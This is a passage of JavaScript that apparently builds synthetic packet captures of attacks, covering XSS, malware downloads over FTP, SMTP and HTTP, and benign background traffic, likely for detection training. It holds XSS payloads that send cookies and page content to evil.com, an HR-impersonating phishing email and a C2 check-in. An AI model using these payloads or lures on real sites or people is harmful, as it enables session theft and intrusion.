      seq += httpReq.length

      const httpResp = HttpPacket.buildResponse(attempt.respCode, attempt.respCode === 200 ? 'OK' : (attempt.respCode === 302 ? 'Found' : 'Internal Server Error'), {
        'Content-Type': 'text/html',
        'Server': 'Apache/2.4.52 (Ubuntu)'
      }, attempt.respBody)
      const tcpResp = TcpPacket.build(80, clientPort, serverSeq, seq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpResp)
      pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.TCP, tcpResp)))
      timestamp += 30
      serverSeq += httpResp.length
    }
  }

  // Connection close
  const finReq = TcpPacket.build(clientPort, 80, seq, serverSeq, TCP_FLAGS.FIN | TCP_FLAGS.ACK)
  pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, finReq)))
  timestamp += 5
  const finAck = TcpPacket.build(80, clientPort, serverSeq, seq + 1, TCP_FLAGS.FIN | TCP_FLAGS.ACK)
  pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.TCP, finAck)))

  // Post-attack legitimate traffic
  const legitimateCountAfter = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountAfter > 0) {
    generateLegitimateTraffic(pcap, timestamp + 5000, srcMac, dstMac, config, legitimateCountAfter, 5000)
  }

  return pcap.build()
}

function generateXss(config) {
  const pcap = new PcapWriter()
  const baseTime = Date.now()
  const srcMac = '00:11:22:33:44:55'
  const dstMac = 'AA:BB:CC:DD:EE:FF'

  console.log(`Generating XSS attack (${config.variant})...`)

  // Pre-attack legitimate traffic
  const legitimateCountBefore = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountBefore > 0) {
    generateLegitimateTraffic(pcap, baseTime - 5000, srcMac, dstMac, config, legitimateCountBefore, 3000)
  }

  let timestamp = baseTime
  let seq = 2000
  let serverSeq = 6000

  // TCP handshake
  const syn = TcpPacket.build(54322, 80, seq, 0, TCP_FLAGS.SYN)
  pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, syn)))
  timestamp += 5
  const synAck = TcpPacket.build(80, 54322, serverSeq, seq + 1, TCP_FLAGS.SYN | TCP_FLAGS.ACK)
  pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.TCP, synAck)))
  timestamp += 3
  seq += 1
  serverSeq += 1
  const ack = TcpPacket.build(54322, 80, seq, serverSeq, TCP_FLAGS.ACK)
  pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, ack)))
  timestamp += 10

  if (config.variant === 'Stored XSS') {
    // Stored XSS: Attacker POSTs malicious payload to be stored, then victim GETs the page

    const xssPayloads = [
      '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
      '<img src=x onerror="fetch(\'http://evil.com/log?c=\'+document.cookie)">',
      '<svg/onload=fetch("http://evil.com/exfil?d="+btoa(document.body.innerHTML))>'
    ]

    for (const payload of xssPayloads) {
      // Attacker stores XSS payload via POST (e.g., comment form)
      const body = `comment=${encodeURIComponent(payload)}&name=anonymous&submit=Post`
      const httpPost = HttpPacket.buildRequest('POST', '/forum/post', config.targetIp, {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': `http://${config.targetIp}/forum`
      }, body)
      const tcpPost = TcpPacket.build(54322, 80, seq, serverSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpPost)
      pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, tcpPost)))
      timestamp += 30
      seq += httpPost.length

      // Server accepts the post
      const postResp = HttpPacket.buildResponse(302, 'Found', {
        'Location': '/forum/thread/42',
        'Content-Type': 'text/html'
      }, '<html><body>Redirecting...</body></html>')
      const tcpPostResp = TcpPacket.build(80, 54322, serverSeq, seq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, postResp)
      pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.TCP, tcpPostResp)))
      timestamp += 500
      serverSeq += postResp.length
    }

    // Victim views the page containing stored XSS
    const victimReq = HttpPacket.buildRequest('GET', '/forum/thread/42', config.targetIp, {
      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
      'Cookie': 'session=victim_session_token_abc123',
      'Accept': 'text/html'
    })
    const tcpVictim = TcpPacket.build(54322, 80, seq, serverSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, victimReq)
    pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build('192.168.1.50', config.targetIp, PROTO.TCP, tcpVictim)))
    timestamp += 30
    seq += victimReq.length

    // Server returns page with stored XSS payload
    const pageResp = HttpPacket.buildResponse(200, 'OK', {
      'Content-Type': 'text/html'
    }, `<html><body><h1>Forum Thread</h1><div class="comment"><p>${xssPayloads[0]}</p></div></body></html>`)
    const tcpPageResp = TcpPacket.build(80, 54322, serverSeq, seq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, pageResp)
    pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp, '192.168.1.50', PROTO.TCP, tcpPageResp)))
    timestamp += 10
    serverSeq += pageResp.length

    // Cookie exfiltration request triggered by stored XSS
    const exfilReq = HttpPacket.buildRequest('GET', '/steal?c=session%3Dvictim_session_token_abc123', 'evil.com', {
      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
    })
    const tcpExfil = TcpPacket.build(54400, 80, 9000, 0, TCP_FLAGS.PSH | TCP_FLAGS.ACK, exfilReq)
    pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build('192.168.1.50', '198.51.100.1', PROTO.TCP, tcpExfil)))

  } else if (config.variant === 'DOM-based XSS') {
    // DOM-based XSS: payload in URL fragment/parameter, page JavaScript processes it unsafely

    const domPayloads = [
      { path: '/page#<script>alert(document.cookie)</script>', desc: 'Hash-based DOM XSS' },
      { path: '/search?q=<img src=x onerror=alert(1)>', desc: 'DOM XSS via innerHTML' },
      { path: '/redirect?url=javascript:alert(document.domain)', desc: 'DOM XSS via location assignment' }
    ]

    for (const item of domPayloads) {
      const httpReq = HttpPacket.buildRequest('GET', item.path, config.targetIp, {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Accept': 'text/html'
      })
      const tcpReq = TcpPacket.build(54322, 80, seq, serverSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpReq)
      pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, tcpReq)))
      timestamp += 30
      seq += httpReq.length

      // Server returns clean HTML but with vulnerable JavaScript that reads from URL
      const respBody = `<html><head><script>
  var userInput = window.location.hash.substring(1) || new URLSearchParams(window.location.search).get('q') || '';
  document.getElementById('output').innerHTML = userInput; // VULNERABLE: unsanitized DOM write
</script></head><body><div id="output"></div></body></html>`
      const httpResp = HttpPacket.buildResponse(200, 'OK', { 'Content-Type': 'text/html' }, respBody)
      const tcpResp = TcpPacket.build(80, 54322, serverSeq, seq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpResp)
      pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.TCP, tcpResp)))
      timestamp += 1000
      serverSeq += httpResp.length
    }

  } else {
    // Reflected XSS: GET with payload in parameter → server reflects it in response

    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      'javascript:alert(document.cookie)',
      '<iframe src="javascript:alert(1)">'
    ]

    for (const payload of xssPayloads) {
      const encodedPayload = encodeURIComponent(payload)
      const httpReq = HttpPacket.buildRequest('GET', `/search?q=${encodedPayload}`, config.targetIp, {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Accept': 'text/html,application/xhtml+xml'
      })
      const tcpReq = TcpPacket.build(54322, 80, seq, serverSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpReq)
      pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, tcpReq)))
      timestamp += 30
      seq += httpReq.length

      // Server reflects the payload back in the response (vulnerable)
      const respBody = `<html><body><h1>Search Results</h1><p>You searched for: ${payload}</p><p>No results found.</p></body></html>`
      const httpResp = HttpPacket.buildResponse(200, 'OK', {
        'Content-Type': 'text/html',
        'Server': 'Apache/2.4.52'
      }, respBody)
      const tcpResp = TcpPacket.build(80, 54322, serverSeq, seq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpResp)
      pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.TCP, tcpResp)))
      timestamp += 1000
      serverSeq += httpResp.length
    }
  }

  // Post-attack legitimate traffic
  const legitimateCountAfter = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountAfter > 0) {
    generateLegitimateTraffic(pcap, timestamp + 2000, srcMac, dstMac, config, legitimateCountAfter, 3000)
  }

  return pcap.build()
}

function generateMalwareDownload(config) {
  const pcap = new PcapWriter()
  const baseTime = Date.now()
  const srcMac = '00:11:22:33:44:55'
  const dstMac = '00:06:5B:EB:03:E0'
  const clientIp = config.sourceIp || '192.168.1.100'
  const serverIp = config.targetIp || '198.51.100.50'

  console.log(`Generating malware download simulation (${config.variant})...`)

  // Pre-attack legitimate traffic
  const legitimateCountBefore = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountBefore > 0) {
    generateLegitimateTraffic(pcap, baseTime - 5000, srcMac, dstMac, config, legitimateCountBefore, 3000)
  }

  let timestamp = baseTime

  if (config.variant === 'FTP Download') {
    // FTP session: control + data channel
    let ctrlSeq = 1000
    let ctrlServerSeq = 5000
    const ctrlPort = 21

    // TCP handshake for FTP control
    const syn = TcpPacket.build(54400, ctrlPort, ctrlSeq, 0, TCP_FLAGS.SYN)
    pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, syn)))
    timestamp += 5
    const synAck = TcpPacket.build(ctrlPort, 54400, ctrlServerSeq, ctrlSeq + 1, TCP_FLAGS.SYN | TCP_FLAGS.ACK)
    pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, synAck)))
    timestamp += 3
    ctrlSeq += 1
    ctrlServerSeq += 1

    // FTP Banner
    const banner = Buffer.from('220 FTP Server Ready\r\n')
    const tcpBanner = TcpPacket.build(ctrlPort, 54400, ctrlServerSeq, ctrlSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, banner)
    pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, tcpBanner)))
    timestamp += 50
    ctrlServerSeq += banner.length

    // USER command
    const userCmd = Buffer.from('USER anonymous\r\n')
    const tcpUser = TcpPacket.build(54400, ctrlPort, ctrlSeq, ctrlServerSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, userCmd)
    pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, tcpUser)))
    timestamp += 10
    ctrlSeq += userCmd.length

    const userResp = Buffer.from('331 Please specify the password.\r\n')
    const tcpUserResp = TcpPacket.build(ctrlPort, 54400, ctrlServerSeq, ctrlSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, userResp)
    pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, tcpUserResp)))
    timestamp += 10
    ctrlServerSeq += userResp.length

    // PASS command
    const passCmd = Buffer.from('PASS anonymous@\r\n')
    const tcpPass = TcpPacket.build(54400, ctrlPort, ctrlSeq, ctrlServerSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, passCmd)
    pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, tcpPass)))
    timestamp += 10
    ctrlSeq += passCmd.length

    const passResp = Buffer.from('230 Login successful.\r\n')
    const tcpPassResp = TcpPacket.build(ctrlPort, 54400, ctrlServerSeq, ctrlSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, passResp)
    pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, tcpPassResp)))
    timestamp += 50
    ctrlServerSeq += passResp.length

    // TYPE I (binary)
    const typeCmd = Buffer.from('TYPE I\r\n')
    const tcpType = TcpPacket.build(54400, ctrlPort, ctrlSeq, ctrlServerSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, typeCmd)
    pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, tcpType)))
    timestamp += 10
    ctrlSeq += typeCmd.length

    const typeResp = Buffer.from('200 Switching to Binary mode.\r\n')
    const tcpTypeResp = TcpPacket.build(ctrlPort, 54400, ctrlServerSeq, ctrlSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, typeResp)
    pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, tcpTypeResp)))
    timestamp += 20
    ctrlServerSeq += typeResp.length

    // RETR command for malware file
    const retrCmd = Buffer.from('RETR /pub/updates/patch_kb9928341.exe\r\n')
    const tcpRetr = TcpPacket.build(54400, ctrlPort, ctrlSeq, ctrlServerSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, retrCmd)
    pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, tcpRetr)))
    timestamp += 10
    ctrlSeq += retrCmd.length

    const retrResp = Buffer.from('150 Opening BINARY mode data connection for patch_kb9928341.exe (4096 bytes).\r\n')
    const tcpRetrResp = TcpPacket.build(ctrlPort, 54400, ctrlServerSeq, ctrlSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, retrResp)
    pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, tcpRetrResp)))
    timestamp += 20
    ctrlServerSeq += retrResp.length

    // Data channel: fake PE binary data in chunks
    let dataSeq = 10000
    const peHeader = Buffer.alloc(1024)
    peHeader[0] = 0x4D; peHeader[1] = 0x5A // MZ header
    peHeader.writeUInt32LE(0x00004550, 60) // PE signature offset
    for (let j = 64; j < 1024; j++) peHeader[j] = Math.floor(Math.random() * 256)

    for (let chunk = 0; chunk < 4; chunk++) {
      const data = chunk === 0 ? peHeader : Buffer.alloc(1024)
      if (chunk > 0) for (let j = 0; j < 1024; j++) data[j] = Math.floor(Math.random() * 256)
      const tcpData = TcpPacket.build(20, 54401, dataSeq, 0, TCP_FLAGS.PSH | TCP_FLAGS.ACK, data)
      pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, tcpData)))
      timestamp += 10
      dataSeq += data.length
    }

    // Transfer complete on control channel
    const completeResp = Buffer.from('226 Transfer complete.\r\n')
    const tcpComplete = TcpPacket.build(ctrlPort, 54400, ctrlServerSeq, ctrlSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, completeResp)
    pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, tcpComplete)))

  } else if (config.variant === 'Email Attachment') {
    // SMTP session with malicious attachment
    let smtpSeq = 1000
    let smtpServerSeq = 5000

    // TCP handshake
    const syn = TcpPacket.build(54500, 25, smtpSeq, 0, TCP_FLAGS.SYN)
    pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, syn)))
    timestamp += 5
    const synAck = TcpPacket.build(25, 54500, smtpServerSeq, smtpSeq + 1, TCP_FLAGS.SYN | TCP_FLAGS.ACK)
    pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, synAck)))
    timestamp += 3
    smtpSeq += 1
    smtpServerSeq += 1

    // SMTP conversation
    const smtpExchange = [
      { from: 'server', data: '220 mail.example.com ESMTP Postfix\r\n' },
      { from: 'client', data: 'EHLO attacker.com\r\n' },
      { from: 'server', data: '250-mail.example.com\r\n250-SIZE 10240000\r\n250 OK\r\n' },
      { from: 'client', data: 'MAIL FROM:<hr@company.com>\r\n' },
      { from: 'server', data: '250 Ok\r\n' },
      { from: 'client', data: 'RCPT TO:<victim@example.com>\r\n' },
      { from: 'server', data: '250 Ok\r\n' },
      { from: 'client', data: 'DATA\r\n' },
      { from: 'server', data: '354 End data with <CR><LF>.<CR><LF>\r\n' },
      { from: 'client', data: 'From: HR Department <hr@company.com>\r\nTo: victim@example.com\r\nSubject: URGENT: Updated Benefits Form\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary="boundary123"\r\n\r\n--boundary123\r\nContent-Type: text/plain\r\n\r\nPlease review the attached updated benefits form.\r\n\r\n--boundary123\r\nContent-Type: application/vnd.ms-excel; name="Benefits_Form_2026.xls"\r\nContent-Disposition: attachment; filename="Benefits_Form_2026.xls"\r\nContent-Transfer-Encoding: base64\r\n\r\nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\ngAAAAA4fug4AtAnNIbgBTM0hkJBLaWRyb3NvZnQg\r\n--boundary123--\r\n.\r\n' },
      { from: 'server', data: '250 Ok: queued as ABC12345\r\n' },
      { from: 'client', data: 'QUIT\r\n' },
      { from: 'server', data: '221 Bye\r\n' }
    ]

    for (const msg of smtpExchange) {
      const data = Buffer.from(msg.data)
      if (msg.from === 'client') {
        const tcp = TcpPacket.build(54500, 25, smtpSeq, smtpServerSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, data)
        pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, tcp)))
        smtpSeq += data.length
      } else {
        const tcp = TcpPacket.build(25, 54500, smtpServerSeq, smtpSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, data)
        pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, tcp)))
        smtpServerSeq += data.length
      }
      timestamp += 50
    }

  } else {
    // HTTP Download (default): DNS resolution + TCP handshake + GET + response with PE binary

    // DNS resolution for malicious domain
    const txId = Math.floor(Math.random() * 65535)
    const dnsQuery = DnsPacket.build(txId, 0x0100, [
      { name: 'updates.malicious-cdn.com', type: 1, class: 1 }
    ])
    const udpQuery = UdpPacket.build(53000, 53, dnsQuery)
    pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(clientIp, '8.8.8.8', PROTO.UDP, udpQuery)))
    timestamp += 20

    const dnsResp = DnsPacket.build(txId, 0x8180,
      [{ name: 'updates.malicious-cdn.com', type: 1, class: 1 }],
      [{ name: 'updates.malicious-cdn.com', type: 1, class: 1, ttl: 60, data: Buffer.from(serverIp.split('.').map(b => parseInt(b))) }]
    )
    const udpResp = UdpPacket.build(53, 53000, dnsResp)
    pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build('8.8.8.8', clientIp, PROTO.UDP, udpResp)))
    timestamp += 30

    // TCP handshake
    let seq = 3000
    let serverSeq = 7000
    const syn = TcpPacket.build(54323, 80, seq, 0, TCP_FLAGS.SYN)
    pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, syn)))
    timestamp += 5
    const synAck = TcpPacket.build(80, 54323, serverSeq, seq + 1, TCP_FLAGS.SYN | TCP_FLAGS.ACK)
    pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, synAck)))
    timestamp += 3
    seq += 1
    serverSeq += 1
    const ack = TcpPacket.build(54323, 80, seq, serverSeq, TCP_FLAGS.ACK)
    pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, ack)))
    timestamp += 10

    // HTTP GET for malware
    const httpReq = HttpPacket.buildRequest('GET', '/downloads/security_update_v2.3.exe', 'updates.malicious-cdn.com', {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'application/octet-stream,*/*'
    })
    const tcpReq = TcpPacket.build(54323, 80, seq, serverSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpReq)
    pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, tcpReq)))
    timestamp += 100
    seq += httpReq.length

    // HTTP response with PE binary
    const peData = Buffer.alloc(2048)
    peData[0] = 0x4D; peData[1] = 0x5A // MZ header
    peData.writeUInt32LE(0x00004550, 60) // PE signature offset
    peData.writeUInt16LE(0x014C, 64) // Machine: i386
    for (let j = 66; j < 2048; j++) peData[j] = Math.floor(Math.random() * 256)

    const httpResp = HttpPacket.buildResponse(200, 'OK', {
      'Content-Type': 'application/octet-stream',
      'Content-Disposition': 'attachment; filename="security_update_v2.3.exe"',
      'Content-Length': peData.length.toString()
    }, peData.toString('binary'))
    const tcpResp = TcpPacket.build(80, 54323, serverSeq, seq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpResp)
    pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, tcpResp)))
    timestamp += 50
    serverSeq += httpResp.length

    // Client ACK
    const ackResp = TcpPacket.build(54323, 80, seq, serverSeq, TCP_FLAGS.ACK)
    pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, ackResp)))

    // C2 callback after download (typical malware behavior)
    timestamp += 2000
    const c2Req = HttpPacket.buildRequest('POST', '/gate.php', 'c2-server.evil.net', {
      'User-Agent': 'Mozilla/5.0',
      'Content-Type': 'application/x-www-form-urlencoded'
    }, `id=${Math.random().toString(36).substring(2)}&os=Windows+10&arch=x64&ver=2.3`)
    const tcpC2 = TcpPacket.build(54324, 443, 10000, 0, TCP_FLAGS.PSH | TCP_FLAGS.ACK, c2Req)
    pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(clientIp, '203.0.113.50', PROTO.TCP, tcpC2)))
  }

  // Post-attack legitimate traffic
  const legitimateCountAfter = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountAfter > 0) {
    generateLegitimateTraffic(pcap, timestamp + 3000, srcMac, dstMac, config, legitimateCountAfter, 3000)
  }

  return pcap.build()
}

function generateLegitimateTraffic(pcap, baseTime, srcMac, dstMac, config, count, timeWindow = null) {
  console.log(`Adding ${count} legitimate packets...`)

  const window = timeWindow || (config.duration * 1000)
  const domains = ['google.com', 'facebook.com', 'amazon.com', 'github.com', 'stackoverflow.com', 'wikipedia.org', 'youtube.com', 'reddit.com']
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0'
  ]
  const httpPaths = ['/', '/index.html', '/api/v1/status', '/images/logo.png', '/css/style.css', '/js/app.js']

  for (let i = 0; i < count; i++) {
    const timestamp = baseTime + Math.floor(Math.random() * window)
    const clientIp = '192.168.1.' + (Math.floor(Math.random() * 200) + 50)
    const trafficType = Math.random()

    if (trafficType < 0.35) {
      // DNS query + response pair
      const domain = domains[Math.floor(Math.random() * domains.length)]
      const txId = Math.floor(Math.random() * 65535)
      const query = DnsPacket.build(txId, 0x0100, [
        { name: domain, type: 1, class: 1 }
      ])
      const udpQuery = UdpPacket.build(53000 + (i % 10000), 53, query)
      pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(clientIp, '8.8.8.8', PROTO.UDP, udpQuery)))

      // DNS response
      const respIp = Buffer.from([
        Math.floor(Math.random() * 200) + 10,
        Math.floor(Math.random() * 256),
        Math.floor(Math.random() * 256),
        Math.floor(Math.random() * 254) + 1
      ])
      const response = DnsPacket.build(txId, 0x8180,
        [{ name: domain, type: 1, class: 1 }],
        [{ name: domain, type: 1, class: 1, ttl: 300, data: respIp }]
      )
      const udpResp = UdpPacket.build(53, 53000 + (i % 10000), response)
      pcap.addPacket(timestamp + 15 + Math.floor(Math.random() * 30), EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build('8.8.8.8', clientIp, PROTO.UDP, udpResp)))

    } else if (trafficType < 0.55) {
      // ICMP ping + pong
      const pingPayload = Buffer.alloc(32)
      for (let j = 0; j < 32; j++) pingPayload[j] = j & 0xff
      const icmpReq = IcmpPacket.build(8, 0, pingPayload)
      pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(clientIp, config.targetIp || '8.8.8.8', PROTO.ICMP, icmpReq)))

      // Echo reply
      const icmpReply = IcmpPacket.build(0, 0, pingPayload)
      pcap.addPacket(timestamp + 5 + Math.floor(Math.random() * 20), EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp || '8.8.8.8', clientIp, PROTO.ICMP, icmpReply)))

    } else {
      // HTTP request + response pair
      const path = httpPaths[Math.floor(Math.random() * httpPaths.length)]
      const host = domains[Math.floor(Math.random() * domains.length)]
      const httpReq = HttpPacket.buildRequest('GET', path, host, {
        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
      })
      const srcPort = 50000 + (i % 15000)
      const seq = Math.floor(Math.random() * 4294967295)
      const tcpReq = TcpPacket.build(srcPort, 80, seq, 0, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpReq)
      pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(clientIp, config.targetIp || '93.184.216.34', PROTO.TCP, tcpReq)))

      // HTTP 200 response
      const bodies = [
        '<html><body><h1>Welcome</h1></body></html>',
        '{"status":"ok","timestamp":' + Date.now() + '}',
        '<html><head><title>Page</title></head><body>Content</body></html>'
      ]
      const httpResp = HttpPacket.buildResponse(200, 'OK', {
        'Content-Type': path.endsWith('.js') ? 'application/javascript' : (path.endsWith('.css') ? 'text/css' : 'text/html'),
        'Server': 'nginx/1.24.0'
      }, bodies[Math.floor(Math.random() * bodies.length)])
      const tcpResp = TcpPacket.build(80, srcPort, Math.floor(Math.random() * 4294967295), seq + httpReq.length, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpResp)
      pcap.addPacket(timestamp + 20 + Math.floor(Math.random() * 80), EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp || '93.184.216.34', clientIp, PROTO.TCP, tcpResp)))
    }
  }
}
